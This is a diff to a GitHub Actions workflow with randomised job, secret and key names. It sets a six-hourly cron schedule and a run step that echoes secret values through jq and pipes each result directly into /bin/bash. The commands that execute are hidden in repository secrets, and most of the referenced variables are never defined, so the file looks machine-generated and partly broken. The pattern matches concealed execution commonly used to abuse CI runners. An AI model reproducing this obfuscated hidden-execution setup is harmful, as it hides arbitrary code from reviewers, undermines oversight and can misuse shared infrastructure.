@@ -1,8 +1,9 @@
 name: songruna9871
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 3/6 * * *'
+    - cron: '24 0/6 * * *'
 
 jobs:
   build:
@@ -12,19 +13,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: songruna9871
         env:
-          mi17: ${{ secrets.mi17 }}
+          pxe7161: ${{ secrets.pxe7161 }}
         run: |
-          echo $mi17 | jq -r .df54765 | /bin/bash
-          echo $fdhre8 | jq -r .ikznh42516 | /bin/bash
-          echo $m38618 | jq -r .x05941 | /bin/bash
-          echo $o81 | jq -r .ste50713 | /bin/bash
-          echo $n428 | jq -r .dsmk2 | /bin/bash
-          echo $w50022 | jq -r .iflhd91 | /bin/bash
-          echo $fsjs5 | jq -r .nm12579 | /bin/bash
-          echo $nmp387 | jq -r .fvajb47 | /bin/bash
-          echo $hn4636 | jq -r .laiti2 | /bin/bash
-          echo $dhrql9864 | jq -r .xou64985 | /bin/bash
-          echo $s3825 | jq -r .rdp0 | /bin/bash
-          echo $p38822 | jq -r .ma7 | /bin/bash
-          echo $otcn968 | jq -r .pvw75096 | /bin/bash
+          echo $pxe7161 | jq -r .opz545 | /bin/bash
+          echo $kwpn5 | jq -r .b06 | /bin/bash
+          echo $juzuz5620 | jq -r .wng32750 | /bin/bash
+          echo $fatw955 | jq -r .mx96 | /bin/bash
+          echo $idai4691 | jq -r .pwq00 | /bin/bash
+          echo $eq8324 | jq -r .gkmbu969 | /bin/bash
+          echo $vou25773 | jq -r .ac701 | /bin/bash
+          echo $g853 | jq -r .pl63 | /bin/bash
+          echo $jswig3 | jq -r .mluha76 | /bin/bash
+          echo $y753 | jq -r .vnex45487 | /bin/bash
+          echo $mn65 | jq -r .dywmj16 | /bin/bash
 
